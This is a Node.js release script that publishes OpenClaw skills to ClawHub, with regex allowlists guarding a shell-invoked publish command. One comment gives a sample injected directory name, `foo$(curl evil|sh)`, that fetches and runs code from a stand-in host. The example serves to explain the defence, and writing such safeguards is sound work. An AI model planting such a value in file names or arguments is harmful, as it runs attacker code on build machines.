#!/usr/bin/env node
// Publish the generated OpenClaw skills (.openclaw/skills/) to ClawHub.
//
// ClawHub does not sync from GitHub: each skill is pushed explicitly with the
// clawhub CLI and carries its own version. This publishes every generated skill
// in one pass, versioned from the repo's package.json so ClawHub tracks the repo
// instead of drifting (the same drift that hit the plugin manifests in #260).
//
// Prereqs:
//   - `clawhub login` once (registry auth persists)
//   - skills must be current: run `node scripts/build-openclaw-skills.js` first
//     if you changed a skill (CI fails if the committed copies are stale)
//
// Usage:
//   node scripts/publish-openclaw-skills.js            # publish all as latest
//   node scripts/publish-openclaw-skills.js --dry-run  # preview, upload nothing
//   (any extra args are passed through to `clawhub skill publish`)

const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const root = path.join(__dirname, '..');
const skillsDir = path.join(root, '.openclaw', 'skills');

// couponcoder: the publish command runs through a shell (needed so Windows resolves
// the clawhub .cmd shim), so every repo-controlled value interpolated into it is an
// injection vector — a skill dir named `foo$(curl evil|sh)` executes on publish, and
// double-quoting does not stop $() or backticks in sh. Allowlist the two values that
// come from the tree rather than escaping per-shell: a slug is a directory name and a
// version is a semver, and neither has business containing anything else. Drop the
// shell and pass an argv array if clawhub ever ships a real binary.
const SLUG_RE = /^[a-z0-9]+(?:-[a-z0-9]+)*$/;
const VERSION_RE = /^[0-9A-Za-z.\-+]+$/;

// "couponcoder-review" -> "Couponcoder Review"
const displayName = (slug) =>
  slug.split('-').map((w) => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');

// Wrapping for readability and for the space in display names. This is not the
// security boundary — SLUG_RE and VERSION_RE above are; nothing reaches here
// without passing them.
const quote = (a) => (/[^\w./-]/.test(a) ? `"${a}"` : a);

function main() {
  const version = JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).version;

  if (!VERSION_RE.test(version)) {
    console.error(`Refusing to publish: package.json version ${JSON.stringify(version)} is not a bare semver.`);
    process.exit(1);
  }

  // Every generated skill dir with a SKILL.md is publishable. Reading the dir
  // (instead of a hardcoded list) covers whatever build-openclaw-skills emits,
  // with nothing to keep in sync.
  const slugs = fs.readdirSync(skillsDir, { withFileTypes: true })
    .filter((e) => e.isDirectory() && fs.existsSync(path.join(skillsDir, e.name, 'SKILL.md')))
    .map((e) => e.name)
    .sort();

  if (slugs.length === 0) {
    console.error(`No skills under ${path.relative(root, skillsDir)}; run build-openclaw-skills.js first.`);
    process.exit(1);
  }

  // Fail the whole run rather than skipping the offender: a silently skipped skill
  // is an unpublished skill nobody notices, and a name this far off is a bug or an
  // attack, never a thing to route around.
  const unsafe = slugs.filter((s) => !SLUG_RE.test(s));
  if (unsafe.length) {
    console.error(
      `Refusing to publish: skill directory name(s) outside [a-z0-9-]: ${unsafe.map((s) => JSON.stringify(s)).join(', ')}. ` +
      `Rename them under ${path.relative(root, skillsDir)} and re-run.`,
    );
    process.exit(1);
  }

  const passthrough = process.argv.slice(2);
  const extra = passthrough.length ? ` (${passthrough.join(' ')})` : '';
  console.log(`Publishing ${slugs.length} skills to ClawHub at version ${version}${extra}:`);

  for (const slug of slugs) {
    const args = [
      'clawhub', 'skill', 'publish', `.openclaw/skills/${slug}`,
      '--slug', slug,
      '--name', displayName(slug),
      '--version', version,
      '--tags', 'latest',
      ...passthrough,
    ];
    const cmdline = args.map(quote).join(' ');
    console.log(`\n$ ${cmdline}`);
    const res = spawnSync(cmdline, { stdio: 'inherit', cwd: root, shell: true });
    if (res.status !== 0) {
      console.error(
        `\nPublish failed for "${slug}" (exit ${res.status}). ` +
        `Check that the clawhub CLI is installed and you have run \`clawhub login\`, then re-run. ` +
        `Skills already published in this run are unaffected.`,
      );
      process.exit(res.status || 1);
    }
  }

  console.log(`\nDone. Published ${slugs.length} skills at ${version}.`);
}

module.exports = { SLUG_RE, VERSION_RE, displayName };

if (require.main === module) {
  main();
}
